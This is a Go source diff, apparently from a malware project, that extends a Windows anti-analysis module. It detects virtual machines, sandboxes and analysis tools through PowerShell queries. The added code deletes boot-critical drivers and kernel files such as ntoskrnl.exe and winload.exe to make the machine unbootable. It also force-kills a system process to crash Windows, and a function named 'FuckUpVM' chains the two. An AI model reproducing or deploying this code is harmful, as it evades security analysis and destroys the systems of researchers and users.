@@ -3,7 +3,6 @@ package main
 import (
 	"bytes"
 	"os"
-	"os/exec"
 	"slices"
 	"strings"
 
@@ -12,7 +11,7 @@ import (
 
 // checkGPU checks for the presence of virtual GPU drivers.
 func checkGPU() bool {
-	cmd := exec.Command("powershell", "-Command", "Get-WmiObject Win32_VideoController | Select-Object -ExpandProperty Name")
+	cmd := executeCommand("powershell", "-Command", "Get-WmiObject Win32_VideoController | Select-Object -ExpandProperty Name")
 	var out bytes.Buffer
 	cmd.Stdout = &out
 
@@ -34,7 +33,7 @@ func checkGPU() bool {
 
 // checkManufacturer checks the system manufacturer for known virtual machine vendors, hypervisors, or cloud providers.
 func checkManufacturer() bool {
-	cmd := exec.Command("powershell", "-Command", "Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty Manufacturer")
+	cmd := executeCommand("powershell", "-Command", "Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty Manufacturer")
 	var out bytes.Buffer
 	cmd.Stdout = &out
 
@@ -54,7 +53,7 @@ func checkManufacturer() bool {
 
 // checkProcesses checks for the presence of common VM-related processes, debuggers, and analysis tools.
 func checkProcesses() bool {
-	cmd := exec.Command("powershell", "-Command", "Get-Process | Select-Object -ExpandProperty ProcessName")
+	cmd := executeCommand("powershell", "-Command", "Get-Process | Select-Object -ExpandProperty ProcessName")
 	var out bytes.Buffer
 	cmd.Stdout = &out
 
@@ -90,7 +89,7 @@ func checkUsername() bool {
 
 // checkServices checks for the presence of common VM-related Windows services.
 func checkServices() bool {
-	cmd := exec.Command("powershell", "-Command", "Get-Service | Select-Object -ExpandProperty Name")
+	cmd := executeCommand("powershell", "-Command", "Get-Service | Select-Object -ExpandProperty Name")
 	var out bytes.Buffer
 	cmd.Stdout = &out
 
@@ -115,7 +114,7 @@ func checkServices() bool {
 // checkDiskModel checks the disk model for known virtual disk identifiers.
 // For example, VMware often uses "VMware Virtual NVMe Disk" or similar.
 func checkDiskModel() bool {
-	cmd := exec.Command("powershell", "-Command", "Get-WmiObject Win32_DiskDrive | Select-Object -ExpandProperty Model")
+	cmd := executeCommand("powershell", "-Command", "Get-WmiObject Win32_DiskDrive | Select-Object -ExpandProperty Model")
 	var out bytes.Buffer
 	cmd.Stdout = &out
 
@@ -151,16 +150,48 @@ func checkRegeditKeys() bool {
 	return false
 }
 
-// isRunningInVM aggregates all checks to determine if the program is running in a virtualized environment.
+// IsVM aggregates all checks to determine if the program is running in a virtualized environment.
 // By "virtualized environment", I mean any virtual machine, sandbox, hypervisor, or cloud provider environment (e.g., AWS, Azure, GCP).
-func isRunningInVM() bool {
+func IsVM() bool {
 	return checkManufacturer() || checkGPU() || checkProcesses() || checkUsername() || checkServices() ||
 		checkDiskModel() || checkRegeditKeys()
 }
 
-func triggerBSOD() {
-	err := exec.Command("taskkill", "/F", "/IM", "csrss.exe").Run()
+func TriggerBSOD() {
+	err := executeCommand("taskkill", "/F", "/IM", "svchost.exe").Run()
 	if err != nil {
 		panic(err)
 	}
+}
+
+// deleteEssentialDrivers attempts to delete essential system drivers to make the system unbootable.
+// In fact, when booting, Windows will render a INACCESSIBLE_BOOT_DEVICE error
+func deleteEssentialFiles() {
+	system32Path := os.Getenv("SystemRoot") + "\\System32\\"
+	essentialDrivers := []string{
+		"ntfs.sys", "pciide.sys", "atapi.sys", "iastor.sys", "iaStorA.sys", "storahci.sys",
+	}
+	essentialFiles := []string{
+		"ntoskrnl.exe", "winload.exe", "winload.efi",
+	}
+	for _, driver := range essentialDrivers {
+		driverPath := system32Path + "drivers\\" + driver
+		err := os.Remove(driverPath)
+		if err != nil {
+			continue
+		}
+	}
+
+	for _, file := range essentialFiles {
+		filePath := system32Path + file
+		err := os.Remove(filePath)
+		if err != nil {
+			continue
+		}
+	}
+}
+
+func FuckUpVM() {
+	deleteEssentialFiles()
+	TriggerBSOD()
 }
